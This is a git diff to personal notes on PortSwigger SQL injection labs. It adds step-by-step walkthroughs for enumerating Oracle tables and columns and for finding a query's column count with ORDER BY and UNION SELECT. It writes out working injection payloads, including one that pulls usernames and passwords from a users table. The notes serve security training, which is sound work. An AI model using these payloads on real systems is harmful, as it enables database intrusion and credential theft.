@@ -78,7 +78,7 @@ Note: Database name is not necessary in when using UNION SELECT on non-oracle MY
 Ref: https://www.sqlshack.com/how-to-find-sql-server-version/
 
 
-###### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+###### Lab: SQL injection attack, listing the database contents on non-Oracle databases
 URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
 Endpoint: category
 
@@ -106,3 +106,62 @@ Response: All Columns in the database users_eyeiho
 
 Ref: https://dba.stackexchange.com/questions/93919/mysql-list-databases-with-tables
 Ref: https://stackoverflow.com/questions/1580450/how-do-i-list-all-the-columns-in-a-table
+
+
+###### Lab: SQL injection attack, listing the database contents on Oracle
+URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+Endpoint: category
+
+Steps:
+```
+1. Click on any filter item.
+2. Add ' to verify if sql injection exists.
+3. Use the Order Clause to check the number of items that are being returned.
+	3a. category=Gifts'+ORDER+BY+1--
+	Response: Returns products
+	3b. category=Gifts'+ORDER+BY+2--
+	Response: Returns products
+	3c. category=Gifts'+ORDER+BY+3--
+	Response: Internal server error
+4. Now we know that there are 2 items in the query.
+5. category=Gifts'+UNION+SELECT+'a','a'+FROM+dual+--+
+6. category='+UNION+SELECT+TABLE_NAME,'a'+FROM+ALL_TABLES--
+   Response: All the Tables
+7.
+category='+UNION+SELECT+column_name,'a'+FROM+all_tab_columns+WHERE+table_name='USERS_GOQFTH'--+
+Response: All the Columns in the table
+8. category='+UNION+SELECT+USERNAME_AGRSKD,PASSWORD_RRZEUC+FROM+USERS_GOQFTH--+
+   Response: All the data in the table
+```
+
+Ref: https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html#GUID-6823CD28-0681-468E-950B-966C6F71325D
+
+
+
+###### Lab: SQL injection UNION attack, determining the number of columns returned by the query
+URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+Endpoint: category
+
+Steps:
+```
+1. Click on any filter item.
+2. Add ' to verify if sql injection exists.
+3. Use the Order Clause to check the number of items that are being returned.
+	3a. category=Gifts'+ORDER+BY+1--
+	Response: Returns products
+	3b. category=Gifts'+ORDER+BY+2--
+	Response: Returns products
+	3c. category=Gifts'+ORDER+BY+3--
+	Response: Returns products
+	3d. category=Gifts'+ORDER+BY+4--
+	Response: Internal server error
+Alternative:
+4. 
+	4a. category=Pets'+UNION+SELECT+NULL--+
+		Response: Error
+	4b. category=Pets'+UNION+SELECT+NULL,NULL--+
+		Response: Error
+	4c. category=Pets'+UNION+SELECT+NULL,NULL,NULL--+
+		Response: Returns Products
+```
+
